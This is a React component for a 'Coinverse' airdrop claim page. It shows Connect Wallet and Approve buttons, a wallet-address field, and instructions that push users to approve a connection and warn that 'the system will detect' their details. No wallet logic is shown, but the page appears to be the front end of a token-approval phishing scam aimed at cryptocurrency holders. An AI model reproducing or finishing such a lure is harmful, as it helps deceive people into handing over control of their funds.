import {
  Button,
  Col,
  Container,
  FormControl,
  InputGroup,
  Navbar,
  Row,
} from "react-bootstrap";
import "./Airdrop.css";

const Airdrop = () => {
  return (
    <>
      <Navbar fixed="top" expand="lg">
        <Container>
          <Button style={{ marginLeft: "auto", marginRight: "0" }} size="lg">
            Connect Wallet
          </Button>
        </Container>
      </Navbar>
      <Container style={{ marginTop: "10rem" }}>
        <Row>
          <Col xs={12}>
            <h1 className="airdrop-text">
              <b>CLAIM COINVERSE AIRDROP</b>
            </h1>
          </Col>
          <Col xs={12} className="pt-5">
            <h4 style={{ color: "white" }}>Your Connected Wallet Address :</h4>
          </Col>
          <Col xs={12} md={3}></Col>
          <Col xs={12} md={6}>
            <InputGroup size="lg">
              <FormControl placeholder="Enter your connected wallet address" />
            </InputGroup>
          </Col>
          <Col xs={12} md={3}></Col>
          <Col xs={12} className="pt-4">
            <Button size="lg">Approve</Button>
          </Col>
          <Col className="pt-4 airdrop-text">
            <p>
              INSTRUCTIONS: To Claim Airdrop please Connect the Wallet and then
              click on Approve button below. After the approval Airdrop will be
              deposited to your Connected Wallet.
            </p>
            <p>
              For TrustWallet please copy the website link and paste to "DApps"
              and then connect to Wallet
            </p>
            <p>
              NOTE: Please Connect the Wallet which is filled in the Airdrop Bot
              otherwise your Airdrop will be denied because system will detect
              your details before processing the Airdrop Tokens.
            </p>
          </Col>
        </Row>
      </Container>
    </>
  );
};

export default Airdrop;
